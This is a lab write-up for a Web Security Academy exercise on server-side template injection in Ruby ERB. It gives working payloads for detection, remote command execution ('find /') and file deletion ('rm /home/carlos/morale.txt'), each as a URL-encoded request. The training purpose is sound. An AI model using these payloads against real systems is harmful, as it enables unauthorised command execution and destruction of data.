Task 1:
///Lab: Basic server-side template injection///

How to detect this vulnerability? The lab description writes: 'To solve the lab, review the ERB documentation'. I found one on the internet:
https://docs.ruby-lang.org/en/master/ERB.html   >>> next hint is: 'find out how to execute arbitrary code'...as you read this page we can find our answer here:
'Expression tags: each begins with '<%=', ends with '%>'; contains a Ruby expression' and another clue that the description writes: 'of an ERB template'
And in the ERB doc: "template = 'The magic word is <%= magic_word %>.'"
So we will use <%= xyz %> to solve this lab. 
Open the lab's site, and click on view details. You will get a 'Unfortunately this product is out of stock' note, and also the url has changed to:
https://0a6f0081045382f1813a20c400e00076.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
Since its a basic lab, we will replace this message= part with our payload. lets see if it vulnerable
https://0a6f0081045382f1813a20c400e00076.web-security-academy.net/?message=<%=3*5%>
And as a result instead of the out of stock note we got 15...which means the server executed the multiplication.
Now, to solve the lab we have to get the morale.txt file. Somehow we have to find this txt file but how?
we will put this payload into the url: <%=`find / -name "morale.txt" 2>/dev/null`%> >>>>you can use ` (alt gr + 7) or you can use <%= system("find / -name "morale.txt" 2>/dev/null") %>
This will looks like this:
https://0a6f0081045382f1813a20c400e00076.web-security-academy.net/?message=%3C%25%3D%60find%20%2F%20-name%20%22morale.txt%22%202%3E%2Fdev%2Fnull%60%25%3E
And as a result we got back: /home/carlos/morale.txt (it actually was in the description but in case we dont know this information this command would be useful...)
Now we have to remove this file...Our payload will be: 
<%=`rm /home/carlos/morale.txt`%> ---> in url:
https://0a6f0081045382f1813a20c400e00076.web-security-academy.net/?message=%3C%25%3D%60rm%20%2Fhome%2Fcarlos%2Fmorale.txt%60%25%3E

